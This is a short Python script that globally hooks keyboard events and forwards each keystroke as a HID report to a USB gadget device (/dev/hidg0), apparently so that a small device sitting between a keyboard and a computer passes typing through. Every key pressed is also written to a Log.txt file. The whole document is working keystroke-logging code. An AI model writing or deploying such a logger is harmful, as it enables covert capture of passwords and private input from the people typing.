import os
import keyboard as k

from convert_keys_to_packets import convert_scancodes_to_packets
SCRIPT_PATH = os.path.dirname(os.path.abspath(__file__))
NULL_CHAR = chr(0)
path_log = f"{SCRIPT_PATH}/Log.txt"


def write_report(report):
    with open('/dev/hidg0', 'rb+') as fd:
        fd.write(report.encode())

def on_key_event(e):
    
    
    pressed_events = k._pressed_events
    print( pressed_events)
    scancodes = [event for event in pressed_events if pressed_events[event].event_type=="down"]
    package_to_send = convert_scancodes_to_packets(scancodes=scancodes)
    write_report(package_to_send)
    if e.event_type == k.KEY_DOWN:
        
            
        with open(path_log, "a") as log:
            try:
                if len(e.name) > 1:
                    log.write(f"[{e.name}]")
                else:
                    log.write(e.name)
            except Exception as ex:
                log.write(f"Error writing event to log: {str(ex)}")
        
        

def setup():
    with open(path_log, "a") as log:
        log.write("\n============New Session=========\n")

if __name__ == "__main__":

        setup()
            
        
                
        k.hook(on_key_event)
        k.wait('esc')
